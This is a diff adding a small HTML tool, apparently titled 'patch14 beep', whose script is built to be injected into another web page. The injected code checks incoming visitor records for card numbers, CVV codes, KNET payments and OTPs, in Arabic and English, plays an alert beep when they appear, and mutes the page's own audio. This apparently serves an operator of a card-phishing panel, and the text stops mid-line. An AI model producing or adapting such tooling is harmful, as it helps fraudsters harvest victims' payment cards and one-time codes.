@@ -1,0 +1,10 @@
+<!doctype html><meta charset="utf-8"><title>patch14</title>
+<style>body{font:13px system-ui;background:#0f1115;color:#eee;padding:16px}input{width:100%;padding:9px;margin:8px 0;background:#151922;color:#eee;border:1px solid #2a2f3a;border-radius:8px;box-sizing:border-box}button{padding:11px 16px;border:0;border-radius:8px;background:#2f6bff;color:#fff;font-weight:700}pre{white-space:pre-wrap;background:#151922;padding:10px;border-radius:8px;font-size:11px}</style>
+<h3>patch14 beep</h3>
+<input id=t placeholder="token">
+<button id=b>RUN</button>
+<pre id=o>ready</pre>
+<script>
+var S2="function mute(){var a=A();if(!a||a.__mute)return;a.__mute=1;a.play=function(){return Promise.resolve()};a.__realPlay=function(){return Promise.resolve()}}";
+var R2="function mute(){var a=A();if(!a)return;if(a.play&&!a.play.__m){a.play=function(){return Promise.resolve()};a.play.__m=1}if(a.__realPlay&&!a.__realPlay.__m){a.__realPlay=function(){return Promise.resolve()};a.__realPlay.__m=1}}";
+var B2="<script id=kddBeep2>(function(){\nif(window.__b2)return;window.__b2=1;\nvar ac=null,lt=0,ls='';\nvar OK=/ملخص|summary|كي نت|knet|بطاقة|card|cvv/i,BAD=/جوال|phone|نفاذ|nafath/i;\nfunction H(x){try{var d=(x&&x.data)||{},p=String(d.page||d['الصفحة']||(x&&x.visitor&&x.visitor.page)||'');if(d.cardNumber||d.cardNumberOnly||d.cvv)return 1;if(!p)return 0;if(OK.test(p))return 1;if(/otp|رمز/i.test(p)&&!BAD.test(p))return 1;return 0}catch(e){return 0}}\nfunction B(){try{ac=ac||new (window.AudioContext||window.webkitAudioContext)();if(ac.state==='suspended')ac.resume();var t=ac.currentTime;[880,1180].forEach(function(f,i){var o=ac.createOscillator(),g=ac.createG
